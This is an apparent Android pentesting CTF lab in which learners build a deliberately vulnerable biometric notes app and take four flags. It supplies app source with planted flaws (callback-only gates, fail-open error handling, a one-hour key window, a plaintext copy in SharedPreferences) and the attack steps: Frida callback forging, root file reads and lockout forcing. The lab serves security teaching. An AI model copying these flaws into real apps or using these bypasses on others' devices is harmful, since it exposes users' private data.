# Lab 04 — CTF: The Fifth Finger

> **Four flags. Four different biometric failures. One of them cannot be taken by attacking the
> biometric at all — and that is the point of the exercise.**

| | |
|---|---|
| **Difficulty** | Advanced |
| **Time** | 2–4 hours |
| **Needs** | A device or emulator you own, with a fingerprint enrolled and a lock credential set. Frida for flags 1 and 4; **flags 2 and 3 need no tooling whatsoever** |
| **Chapter sections** | All of [§3](../README.md), [§5.3](../README.md), [§7](../README.md) |
| **Prerequisite labs** | [01](lab-01-callback-vs-crypto.md) and [02](lab-02-auth-bound-keys.md) |

> **⚠️ Warning — deliberately vulnerable**
> `VaultTimeApp` is built from broken code on purpose. Build and install it **only on a device or
> emulator you own**. It has no network permission and every endpoint named in its source uses the
> `.invalid` TLD, which is reserved by RFC 2606 and can never resolve. Uninstall it when you finish.

---

## 0. Scenario

You have been handed a build of **VaultTime**, a note-keeping app that claims:

> *"Your notes are protected by your fingerprint and by hardware-backed encryption. Even we cannot
> read them."*

Marketing is half right. Somewhere in the app there is a genuine, correctly-bound, hardware-enforced
key that resists everything you know how to do. Everything else around it is wrong.

Your job is not to prove the marketing false. It is to work out **exactly which of the four claims
holds and which do not**, and to take the four flags along the way.

Scoring rewards precision, not access. A solver who takes all four flags and cannot say which one
required no tooling has learned less than one who takes three and explains why the fourth is
different.

---

## 1. Building the target

`VaultTime` is four activities in one project. Create a standard Android Studio project
(`com.pentest.ch48.ctf`, minSdk 23, compileSdk 34) with `androidx.biometric:biometric:1.1.0` and
`androidx.appcompat:appcompat:1.6.1`, and add the four activities below. All paths are **inside the
project you create**, not inside this repository.

```xml
<!-- app/src/main/AndroidManifest.xml   (in the project you create) -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
    <!-- deliberately NO android.permission.INTERNET -->
    <application
        android:allowBackup="false"
        android:label="VaultTime"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">

        <activity android:name=".MenuActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".QuickNotesActivity"   android:exported="false" />
        <activity android:name=".RecoveryActivity"     android:exported="false" />
        <activity android:name=".SyncActivity"         android:exported="false" />
        <activity android:name=".VaultActivity"        android:exported="false" />
    </application>
</manifest>
```

### 1.1 `MenuActivity` — four buttons

```java
// app/src/main/java/com/pentest/ch48/ctf/MenuActivity.java  (in the project you create)
package com.pentest.ch48.ctf;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import androidx.appcompat.app.AppCompatActivity;

public class MenuActivity extends AppCompatActivity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        add(root, "Quick Notes",   QuickNotesActivity.class);
        add(root, "Recovery",      RecoveryActivity.class);
        add(root, "Sync Settings", SyncActivity.class);
        add(root, "The Vault",     VaultActivity.class);
        setContentView(root);
    }
    private void add(LinearLayout root, String label, Class<?> target) {
        Button btn = new Button(this);
        btn.setText(label);
        btn.setOnClickListener(v -> startActivity(new Intent(this, target)));
        root.addView(btn);
    }
}
```

### 1.2 `QuickNotesActivity` — flag 1

```java
// app/src/main/java/com/pentest/ch48/ctf/QuickNotesActivity.java  (in the project you create)
package com.pentest.ch48.ctf;

import android.os.Bundle;
import android.util.Base64;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.biometric.BiometricManager;
import androidx.biometric.BiometricPrompt;
import androidx.core.content.ContextCompat;

public class QuickNotesActivity extends AppCompatActivity {

    private boolean unlocked = false;
    private TextView out;

    // "encryption"
    private static final String BLOB =
        "Q0g0OHtvbmVfYXJndW1lbnRfaXNfdGhlX3dob2xlX2F1ZGl0fQ==";

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        out = new TextView(this);
        out.setText("locked");
        setContentView(out);

        BiometricPrompt p = new BiometricPrompt(this, ContextCompat.getMainExecutor(this),
            new BiometricPrompt.AuthenticationCallback() {
                @Override public void onAuthenticationSucceeded(
                        BiometricPrompt.AuthenticationResult r) {
                    unlocked = true;
                    reveal();
                }
            });

        p.authenticate(new BiometricPrompt.PromptInfo.Builder()
            .setTitle("Unlock Quick Notes")
            .setNegativeButtonText("Cancel")
            .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_WEAK)
            .build());
    }

    void reveal() {
        if (!unlocked) return;
        out.setText(new String(Base64.decode(BLOB, Base64.NO_WRAP)));
    }
}
```

### 1.3 `RecoveryActivity` — flag 2

```java
// app/src/main/java/com/pentest/ch48/ctf/RecoveryActivity.java  (in the project you create)
package com.pentest.ch48.ctf;

import android.os.Bundle;
import android.util.Base64;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.biometric.BiometricManager;
import androidx.biometric.BiometricPrompt;
import androidx.core.content.ContextCompat;

public class RecoveryActivity extends AppCompatActivity {

    private TextView out;
    private static final String BLOB =
        "Q0g0OHtldmVyeV9lcnJvcl9wYXRoX2lzX2FfZG9vcn0=";

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        out = new TextView(this);
        out.setText("locked");
        setContentView(out);

        BiometricManager bm = BiometricManager.from(this);
        int can = bm.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_STRONG);
        if (can != BiometricManager.BIOMETRIC_SUCCESS) {
            // "if they can't use biometrics we mustn't lock them out of their own data"
            reveal();
            return;
        }

        BiometricPrompt p = new BiometricPrompt(this, ContextCompat.getMainExecutor(this),
            new BiometricPrompt.AuthenticationCallback() {
                @Override public void onAuthenticationSucceeded(
                        BiometricPrompt.AuthenticationResult r) { reveal(); }

                @Override public void onAuthenticationError(int code, CharSequence msg) {
                    // "the sensor is having a bad day, don't punish the user"
                    if (code == BiometricPrompt.ERROR_LOCKOUT
                     || code == BiometricPrompt.ERROR_LOCKOUT_PERMANENT
                     || code == BiometricPrompt.ERROR_HW_UNAVAILABLE
                     || code == BiometricPrompt.ERROR_NO_BIOMETRICS) {
                        reveal();
                    }
                }
            });

        p.authenticate(new BiometricPrompt.PromptInfo.Builder()
            .setTitle("Recovery")
            .setNegativeButtonText("Cancel")
            .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
            .build());
    }

    void reveal() { out.setText(new String(Base64.decode(BLOB, Base64.NO_WRAP))); }
}
```

### 1.4 `SyncActivity` — flag 3

```java
// app/src/main/java/com/pentest/ch48/ctf/SyncActivity.java  (in the project you create)
package com.pentest.ch48.ctf;

import android.content.Context;
import android.os.Bundle;
import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import android.security.keystore.UserNotAuthenticatedException;
import android.util.Base64;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.biometric.BiometricManager;
import androidx.biometric.BiometricPrompt;
import androidx.core.content.ContextCompat;

import java.security.KeyStore;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class SyncActivity extends AppCompatActivity {

    private static final String ALIAS = "vaulttime_sync_key";
    // https://sync.vaulttime.invalid/v1 - never resolves, and the app has no INTERNET permission
    private static final String FLAG = "CH48{a_window_wide_enough_to_walk_through}";

    private TextView out;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        out = new TextView(this);
        setContentView(out);
        try { run(); } catch (Exception e) { out.setText("error: " + e); }
    }

    private SecretKey key() throws Exception {
        KeyStore ks = KeyStore.getInstance("AndroidKeyStore"); ks.load(null);
        SecretKey existing = (SecretKey) ks.getKey(ALIAS, null);
        if (existing != null) return existing;

        KeyGenerator kg = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
        kg.init(new KeyGenParameterSpec.Builder(ALIAS,
                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setKeySize(256)
            .setUserAuthenticationRequired(true)
            .setInvalidatedByBiometricEnrollment(true)
            .setUserAuthenticationValidityDurationSeconds(3600)   // "one hour is plenty short"
            .build());
        return kg.generateKey();
    }

    private void run() throws Exception {
        SecretKey k = key();
        var sp = getSharedPreferences("sync", Context.MODE_PRIVATE);

        if (!sp.contains("blob")) {                       // first run: seal
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            try {
                c.init(Cipher.ENCRYPT_MODE, k);
                seal(c, sp); return;
            } catch (UserNotAuthenticatedException e) {
                prompt(c, cc -> { try { seal(cc, sp); } catch (Exception x) { out.setText("" + x); } });
                return;
            }
        }

        byte[] iv   = Base64.decode(sp.getString("iv", ""),   Base64.NO_WRAP);
        byte[] blob = Base64.decode(sp.getString("blob", ""), Base64.NO_WRAP);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        try {
            c.init(Cipher.DECRYPT_MODE, k, new GCMParameterSpec(128, iv));
            out.setText(new String(c.doFinal(blob)));      // no prompt shown at all
        } catch (UserNotAuthenticatedException e) {
            prompt(c, cc -> {
                try { out.setText(new String(cc.doFinal(blob))); }
                catch (Exception x) { out.setText("" + x); }
            });
        }
    }

    private void seal(Cipher c, android.content.SharedPreferences sp) throws Exception {
        sp.edit().putString("blob", Base64.encodeToString(c.doFinal(FLAG.getBytes()), Base64.NO_WRAP))
                 .putString("iv",   Base64.encodeToString(c.getIV(),                  Base64.NO_WRAP))
                 .apply();
        out.setText("sync configured");
    }

    private interface Then { void run(Cipher c); }

    private void prompt(Cipher c, Then then) {
        BiometricPrompt p = new BiometricPrompt(this, ContextCompat.getMainExecutor(this),
            new BiometricPrompt.AuthenticationCallback() {
                @Override public void onAuthenticationSucceeded(
                        BiometricPrompt.AuthenticationResult r) {
                    then.run(r.getCryptoObject().getCipher());
                }
            });
        p.authenticate(new BiometricPrompt.PromptInfo.Builder()
                .setTitle("Sync Settings")
                .setNegativeButtonText("Cancel")
                .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
                .build(),
            new BiometricPrompt.CryptoObject(c));
    }
}
```

### 1.5 `VaultActivity` — flag 4

```java
// app/src/main/java/com/pentest/ch48/ctf/VaultActivity.java  (in the project you create)
package com.pentest.ch48.ctf;

import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import android.security.keystore.UserNotAuthenticatedException;
import android.util.Base64;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.biometric.BiometricManager;
import androidx.biometric.BiometricPrompt;
import androidx.core.content.ContextCompat;

import java.security.KeyStore;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;

public class VaultActivity extends AppCompatActivity {

    private static final String ALIAS = "vaulttime_vault_key";
    private static final String FLAG  = "CH48{the_key_was_never_the_weak_part}";
    private TextView out;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        out = new TextView(this);
        setContentView(out);
        try { run(); } catch (Exception e) { out.setText("error: " + e); }
    }

    /** Per-use, Class 3 only, invalidated on re-enrolment. This part is CORRECT. */
    private SecretKey key() throws Exception {
        KeyStore ks = KeyStore.getInstance("AndroidKeyStore"); ks.load(null);
        SecretKey existing = (SecretKey) ks.getKey(ALIAS, null);
        if (existing != null) return existing;

        KeyGenerator kg = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
        KeyGenParameterSpec.Builder sb = new KeyGenParameterSpec.Builder(ALIAS,
                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setKeySize(256)
            .setUserAuthenticationRequired(true)
            .setInvalidatedByBiometricEnrollment(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            sb.setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG);
        }
        kg.init(sb.build());
        return kg.generateKey();
    }

    private void run() throws Exception {
        SecretKey k = key();
        var sp = getSharedPreferences("vault", Context.MODE_PRIVATE);

        if (!sp.contains("blob")) {
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            try { c.init(Cipher.ENCRYPT_MODE, k); } catch (UserNotAuthenticatedException ignored) { }
            prompt(c, cc -> {
                try {
                    sp.edit()
                      .putString("blob", Base64.encodeToString(cc.doFinal(FLAG.getBytes()), Base64.NO_WRAP))
                      .putString("iv",   Base64.encodeToString(cc.getIV(), Base64.NO_WRAP))
                      // ------------------------------------------------------------------
                      // "belt and braces: keep a copy we can restore from if the key is ever
                      //  invalidated, so the user never loses their vault"
                      // ------------------------------------------------------------------
                      .putString("recovery_hint", Base64.encodeToString(FLAG.getBytes(), Base64.NO_WRAP))
                      .apply();
                    out.setText("vault sealed");
                } catch (Exception x) { out.setText("" + x); }
            });
            return;
        }

        byte[] iv   = Base64.decode(sp.getString("iv", ""),   Base64.NO_WRAP);
        byte[] blob = Base64.decode(sp.getString("blob", ""), Base64.NO_WRAP);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        try { c.init(Cipher.DECRYPT_MODE, k, new GCMParameterSpec(128, iv)); }
        catch (UserNotAuthenticatedException ignored) { }
        prompt(c, cc -> {
            try { out.setText(new String(cc.doFinal(blob))); }
            catch (Exception x) { out.setText("" + x); }
        });
    }

    private interface Then { void run(Cipher c); }

    private void prompt(Cipher c, Then then) {
        BiometricPrompt p = new BiometricPrompt(this, ContextCompat.getMainExecutor(this),
            new BiometricPrompt.AuthenticationCallback() {
                @Override public void onAuthenticationSucceeded(
                        BiometricPrompt.AuthenticationResult r) {
                    // Correct: the cipher comes from the RESULT.
                    BiometricPrompt.CryptoObject co = r.getCryptoObject();
                    if (co == null || co.getCipher() == null) { out.setText("refused"); return; }
                    then.run(co.getCipher());
                }
            });
        p.authenticate(new BiometricPrompt.PromptInfo.Builder()
                .setTitle("The Vault")
                .setNegativeButtonText("Cancel")
                .setConfirmationRequired(true)
                .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
                .build(),
            new BiometricPrompt.CryptoObject(c));
    }
}
```

### 1.6 Install

```bash
# host
./gradlew :app:assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk

# MIUI "Install via USB" refusal? use root:
adb push app-debug.apk /data/local/tmp/vt.apk
adb shell "su -c 'pm install -r /data/local/tmp/vt.apk'"
adb shell rm -f /data/local/tmp/vt.apk
```

Open each of the four screens once with a real fingerprint so the vault and sync blobs are sealed.
Then begin.

---

## 2. Rules

1. **Every flag must be taken with a stated technique.** "I opened the app and it worked" only
   counts if you can say *why* it worked.
2. **You may not read the source you just pasted in.** Treat the installed APK as the target: pull
   it, decompile it, and work from that. If you cheat here you lose the only part of the exercise
   that transfers.
3. **Record, per flag, what tooling you needed.** Two flags need none. Knowing which is the point.
4. **State your reach for each flag.** Did you get plaintext, or a screen?

---

## 3. Reconnaissance (do this first — it is worth more than any flag)

```bash
# host
adb shell "pm path com.pentest.ch48.ctf"
adb pull <path> vt.apk
jadx -d vt-jadx vt.apk
python3 -B ../scripts/grade-biometric-usage.py vt-jadx --show-evidence
```

Before you attack anything, fill in this table from static evidence alone:

| Screen | `authenticate()` args | auth-bound key? | validity window | Predicted grade |
|---|---|---|---|---|
| QuickNotes | | | | |
| Recovery | | | | |
| Sync | | | | |
| Vault | | | | |

Then, and only then, start.

---

## 4. Flag 1 — Quick Notes

**Format:** `CH48{...}`

**What to notice.** `authenticate()` takes one argument. There is no key anywhere in this class. The
`AuthenticationResult` parameter is never read.

**Intended route.**

```bash
# host
frida -U -f com.pentest.ch48.ctf -l ../scripts/hook-biometric-prompt.js
```

Open Quick Notes, then:

```
[1]-> forge()
```

**Alternative route**, which is shorter and worth doing as well so you see there are two:

```javascript
// frida REPL
Java.perform(function () {
    Java.choose('com.pentest.ch48.ctf.QuickNotesActivity', {
        onMatch: function (a) {
            a.unlocked.value = true;
            Java.scheduleOnMainThread(function () { a.reveal(); });
        },
        onComplete: function () {}
    });
});
```

**Third route, no Frida at all.** The blob is a constant in the DEX and Base64 is not encryption:

```bash
# host
grep -rn "Q0g0O" vt-jadx | head
echo 'Q0g0OHtvbmVfYXJndW1lbnRfaXNfdGhlX3dob2xlX2F1ZGl0fQ==' | base64 -d
```

**Report the third route, not the first.** The finding is not "the biometric is bypassable" — it is
"the data is a constant in the APK and the biometric was never protecting anything". Severity:
**Informational to Low**, and it would be Low even if the prompt were perfect.

---

## 5. Flag 2 — Recovery

**Format:** `CH48{...}`

**No tooling is permitted for this flag.** No Frida, no root, no repackaging. Just the device.

**What to notice.** This screen asks for `BIOMETRIC_STRONG` — better than Quick Notes — and it still
falls open. Two separate branches lead to `reveal()` and neither involves a successful
authentication.

**Route A — arrange for `canAuthenticate` to fail.** The `if` at the top calls `reveal()` on any
non-success. Produce one:

```bash
# host — on a test device or emulator with nothing enrolled
adb shell 'dumpsys fingerprint'      # confirm "count":0
```

Remove every enrolled fingerprint in Settings and open Recovery. `canAuthenticate(BIOMETRIC_STRONG)`
returns `11` (`ERROR_NONE_ENROLLED`) and the flag appears.

**Route B — force `ERROR_LOCKOUT`.** Keep an enrolment, open Recovery, and present a wrong finger
repeatedly. After enough consecutive failures the framework issues `ERROR_LOCKOUT` (`7`) and the
error handler reveals the flag.

Route B is the more instructive one, because **the attacker controls it** with nothing but the
phone in their hand.

**Report it as:** fail-open on both the availability check and the error callback,
`BiometricPrompt.ERROR_LOCKOUT` reachable by any holder of the device, **no code execution
required**. That last clause is what makes this **High** and Quick Notes **Low**, despite Quick
Notes looking more dramatic in a demo.

---

## 6. Flag 3 — Sync Settings

**Format:** `CH48{...}`

**No tooling is permitted for this flag either.** If you find yourself writing a Frida script, stop
and re-read lab 02.

**What to notice.** This screen does everything the guidance says. It creates an `AndroidKeyStore`
key with `setUserAuthenticationRequired(true)`. It sets `setInvalidatedByBiometricEnrollment(true)`.
It passes a `CryptoObject`. It reads the cipher from the result. The grader gives it **B**, not D.

Now read the one line that matters, and decode the constant:

```
setUserAuthenticationValidityDurationSeconds(3600)
```

In smali that is `const/16 vN, 0xe10`.

**Route.** Unlock the phone normally — with the PIN, or with a fingerprint, or by any means at all —
and open Sync Settings within the hour. The `Cipher.init` in the `try` branch **succeeds**, the
`doFinal` runs, and the flag appears **with no prompt displayed at all**.

Prove it deliberately rather than by accident:

```bash
# host — emulator or test device
adb shell locksettings verify --old 1234    # a credential check by an unrelated process
adb shell am start -n com.pentest.ch48.ctf/.SyncActivity
```

Then demonstrate the negative half, which is what makes it a measurement rather than a coincidence:

```bash
# host — lock the device and wait out the window
adb shell input keyevent 26
# wait more than 3600 seconds, or delete the key and rebuild it with a 30-second window to test faster
adb shell am start -n com.pentest.ch48.ctf/.SyncActivity
```

**The structural tell you should have found in §3**, before any of this: there is real work inside
the `try` around `Cipher.init`. In a per-use implementation that branch is unreachable, because the
init always throws. Work in the `try` branch means the key has a window.

**Report it as:** time-bound auth binding with a 3,600-second window, satisfied by any device
authentication in that period by any process, with no prompt from the application.
Severity **Medium**, raised to **High** for a stolen-unlocked-device threat model. Precondition: the
device unlocked within the hour. **No code execution required.**

---

## 7. Flag 4 — The Vault

**Format:** `CH48{...}`

**This is the one that cannot be taken by attacking the biometric.**

**What to notice.** The key is per-use. `setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)`
excludes the device credential. `setInvalidatedByBiometricEnrollment(true)` is set and, because the
key is per-use, is actually honoured. The prompt asks for `BIOMETRIC_STRONG` with
`setConfirmationRequired(true)`. The cipher comes from the result.

Try to break it, and record each failure — the failures are the deliverable:

```bash
# host
frida -U -f com.pentest.ch48.ctf -l ../scripts/hook-biometric-prompt.js
```

```
[1]-> forge()
[1]-> forge(true)
[1]-> report()
```

Expected:

```
CRYPTO  Cipher.init(AES/GCM/NoPadding) THREW  UserNotAuthenticatedException - HARDWARE REFUSED
---- VERDICT ----
BINDING HELD. A callback was forged and the cryptographic operation was still
refused by the keystore. The prompt is not bypassable by this technique.
```

Now stop attacking the biometric and go and look at the app.

**Route.** The seal path writes three keys into `SharedPreferences`. Two are the ciphertext and the
IV. The third is a "recovery hint" — the flag, Base64-encoded, with no encryption at all, written by
the same developer who correctly configured the key.

```bash
# adb shell — debuggable build
run-as com.pentest.ch48.ctf cat /data/data/com.pentest.ch48.ctf/shared_prefs/vault.xml
```

```bash
# host — decode
echo '<the recovery_hint value>' | base64 -d
```

If `run-as` refuses, note **which** refusal you got — `package not debuggable` and `package not an
application` mean different things (chapter 60) — and fall back to root:

```bash
# adb shell
su -c 'cat /data/data/com.pentest.ch48.ctf/shared_prefs/vault.xml'
```

**Report it as:** the biometric binding is correctly implemented and resisted callback forgery; the
plaintext is nevertheless recoverable because the application persists an unencrypted copy in
`SharedPreferences`. Severity **High**. The finding is **storage**, and the biometric section of the
report should say **pass**.

> **🧠 Mental Model**
> This is the most important flag in the CTF and the least fun to take. The lesson is the whole
> chapter's professional argument: *the biometric is usually not the weakest link, and a tester who
> only knows how to attack the biometric will report the wrong finding — or report the app as secure
> because the technique they know failed.*

---

## 8. Scoring

| Item | Points |
|---|---|
| Flag 1 | 10 |
| Flag 2 | 20 |
| Flag 3 | 25 |
| Flag 4 | 25 |
| **The §3 recon table, filled in from static evidence before any exploitation** | **15** |
| Correctly identifying which two flags needed **no tooling** | 15 |
| A severity for each flag with the reasoning, using [lab 03 §6](lab-03-audit-a-real-app.md)'s table | 20 |
| Stating, for flag 4, that the biometric implementation is a **pass** | **20** |
| *Penalty:* reporting flag 1 as "Critical biometric bypass" | **−20** |
| *Penalty:* reporting flag 4 as a biometric weakness | **−20** |
| **Total** | **150** |

The two penalties are larger than two flags. That is deliberate.

---

## 9. Hints

<details>
<summary>Flag 1 — forge() says "no callback observed yet"</summary>
Trigger the prompt first so the script captures the callback instance. If the prompt is dismissed
too fast, use the `Java.choose` route on the activity's `unlocked` field instead — it needs no
callback at all.
</details>

<details>
<summary>Flag 2 — I removed my fingerprint and nothing changed</summary>
Confirm with `adb shell dumpsys fingerprint` that `"count"` is `0`. On a multi-user device the
enrolment may belong to a different user. Also confirm you are on the Recovery screen, not
Quick Notes.
</details>

<details>
<summary>Flag 2 — I cannot trigger ERROR_LOCKOUT</summary>
The threshold is several consecutive *failed matches*, not cancellations. Present a finger that is
enrolled on nobody — the side of your hand works. Watch logcat for the error code.
</details>

<details>
<summary>Flag 3 — the app always prompts me</summary>
Then the window is closed: more than 3,600 seconds have passed since any authentication. Unlock the
device (or `adb shell locksettings verify --old <pin>`) and reopen the screen immediately.
</details>

<details>
<summary>Flag 3 — Cipher.init throws even right after unlocking</summary>
Check `KeyInfo.getUserAuthenticationType()` for this key. If your device produced a key that accepts
only `AUTH_BIOMETRIC_STRONG`, a PIN unlock will not satisfy it — use a fingerprint instead. Lab 02
§5 covers reading `KeyInfo` back.
</details>

<details>
<summary>Flag 4 — I have tried everything against the prompt</summary>
Good. Write down each thing you tried and what it produced; that list is worth 20 points. Then stop
looking at the prompt and start looking at where the app puts things.
</details>

<details>
<summary>Flag 4 — run-as says "package not debuggable"</summary>
You installed the release variant. Rebuild the debug one, or use root. Note the exact refusal text
in your report — chapter 60 measured three distinct `run-as` refusals with three distinct causes.
</details>

---

## 10. Clean up

```bash
# host
adb uninstall com.pentest.ch48.ctf
adb shell 'ls /data/local/tmp | grep -iE "ch48|vt"'      # expect nothing
```

Uninstalling removes `vaulttime_sync_key` and `vaulttime_vault_key` along with the app's UID; you do
not need to delete keystore entries by hand. If you changed the device's enrolment or lock
credential for flag 2 or 3, restore it now.

---

## 11. Debrief — the four failures, named

| Flag | Failure class | Needed tooling? | Real severity | Chapter reference |
|---|---|---|---|---|
| 1 | Callback-only gate over data that was a constant in the APK | Frida, or nothing | **Low** — the storage is the finding | [§5.3 V1](../README.md) |
| 2 | Fail-open on availability **and** on error | **None** | **High** — any holder of the device | [§3.11, §5.3 V3](../README.md) |
| 3 | Time-bound key with a one-hour window | **None** | **Medium/High** | [§3.6, §5.3 V2](../README.md) |
| 4 | Correct binding, plaintext copy in `SharedPreferences` | root or `run-as` | **High** — but the biometric is a **pass** | [33 — Storage](../../33-Storage/README.md) |

The two flags that needed no tooling carry the higher severities. That inversion is the single most
useful thing to take away from this lab, and it is why §5.7's ten-minute checklist starts with
`dumpsys` and not with Frida.
